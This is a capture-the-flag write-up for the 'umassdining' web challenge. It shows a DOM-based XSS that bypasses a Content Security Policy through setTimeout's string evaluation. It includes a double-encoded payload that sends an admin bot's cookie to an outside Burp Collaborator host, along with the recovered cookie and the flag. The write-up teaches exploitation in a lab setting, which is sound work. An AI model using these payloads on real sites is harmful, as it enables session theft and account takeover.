# umassdining

Categories: Web

Description:  
> I heard there are these weirdos who love UMASS dining a little bit too much.
> Can you infilitrate their secret society and get their super secret flag for
> me?

## Takeaways

DOM-based XSS. Finally a use-case for double encoding.

## Solution

In this challenge we are given the source code. As we can see from the source,
we need to reach `/join` to get the flag, but that is only possible if we have
the correct admin `auth` cookie. So, we somehow have to leak it. The app also
has Content-Security-Policy (CSP) enabled, which is set to `"default-src
'self';script-src 'self' 'unsafe-eval'"`. So, it seems that somehow invoking
an `eval` with attacker-controlled data should be our way to go here.

There seems to be an admin bot. The user submits essays at the `/register`
endpoint via POST requests, with the parameters `email` and `essay`. Then, the
bot will visit the URL `/review/essay?email={email}&essay={essay}` which is
only accessible from `127.0.0.1`.

A first attempt to bypass the IP restriction was by using the `x-forwarded-
for` and similar headers, but this didn't work.

The next thing to note is how the user-controlled parameters are handled. The
`/review/essay` will get its contents by populating `essay_checker.html` and
in this template file we notice the expression `{{essay.essay|safe}}`. This
means that this parameter will not be escaped and is assumed to be already
safe. So, the `essay` variable allows us for an XSS attack:

```  
POST /register

email=asd%40foo.com&essay=<script>alert(1)</script>  
```

Results in the  `GET review/[email protected]&essay=<script>alert(1)</script>`
by the admin bot. However, the bot will not get XSSed, because of CSP.
Instead, the following message will be displayed in console: `Content Security
Policy: The page’s settings blocked the loading of a resource at inline
(“script-src”)`. So we have to somehow circumvent CSP.

Looking at the source code, we notice this bizarre javascript

```javascript  
var iloveumass = document.getElementById("debug").getAttribute("data-
iloveumass");  
function say_something(words) {  
   setTimeout(`console.log('${words}')`,500)  
}  
document.addEventListener("DOMContentLoaded", function() {  
   say_something(iloveumass)  
});  
```

So, when the document has been loaded and parsed,
``setTimeout(`console.log('${words}')`,500)`` is invoked, where the
`words=document.getElementById("debug").getAttribute("data-iloveumass");`.
What is *evil* here, is the [setTimeout
function](https://developer.mozilla.org/en-
US/docs/web/api/settimeout#passing_string_literals) with a string parameter.
As the documentation states:

> Passing a string instead of a function to setTimeout() has the same problems
> as using eval().

And here we are passing a string. Also notice that `eval()` is allowed by the
current CSP policy. So, we just have to inject the thing.js script and an HTML
element with id `debug` and attribute `data-iloveumass` which will hold our
XSS payload. The following `essay` value will trigger an `alert(1)` on the
bot:

`

<script src=/static/js/thing.js></script>`

So the request is:

```  
POST /register

email=asd%40foo.com&essay=<p+id%3d"debug"++data-
iloveumass%3d"')%3b+alert(1)%3b+//">

+<script+src%3d/static/js/thing.js></script>  
```

We modify the above payload to instead leak the admin's cookie:

`

<script src=/static/js/thing.js></script>`

We use `window.location` here as because of the CSP, the bot is not allowed to
make requests to other origins. So, for example `![](x)` is not allowed. Also
inline scripts, like `<script>xss</script>` are not allowed. So, the final
request is:

```  
POST /register

email=asd%40foo.com&essay=<p%2bid%253d"debug"%2b%2bdata-
iloveumass%253d"')%253b%2bwindow.location%2b%253d%2b'http%253a//nb20aa7dkwzrirpv5qa71lnleck28r.burpcollaborator.net/cookie%253d'%252bencodeURIComponent(btoa(document.cookie))%253b%2b//">

%2b<script%2bsrc%253d/static/js/thing.js></script>  
```

Notice the double encoding of all the characters. The first encoding is for
the current request that we are making. Then, when the bot will make the
request, it will decode the characters once more. So, after the first
decoding, the bot will do the following request:

```  
GET /review/[email protected]&essay=<p+id%3d"debug"++data-
iloveumass%3d"')%3b+window.location+%3d+'http%3a//nb20aa7dkwzrirpv5qa71lnleck28r.burpcollaborator.net/cookie%3d'%2bencodeURIComponent(btoa(document.cookie))%3b+//">

+<script+src%3d/static/js/thing.js></script>  
```

So, the double encoding ensures that our payload is correctly formatted when
the bot makes the `GET` request. If we had only encoded our payload once, then
the `+` in the string concatenation would have been interpreted as a space
character when the bot would make the request.

Now, checking back to our callback URL, we see the request `GET
/cookie=YXV0aD1WRWd4VXpGVFJEUlRWVkF6VWxNelExSXpWRFJFVFRGT1F6QXdTMGt6VERCTUlR`.
The decoded value is `auth=VEgxUzFTRDRTVVAzUlMzQ1IzVDRETTFOQzAwS0kzTDBMIQ`.
So, we set the cookie in our browser and visit `/join`. Then, we are presented
with the flag:

`UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}`  

Original writeup (https://github.com/nikosChalk/ctf-
writeups/tree/master/umass22/umassdining).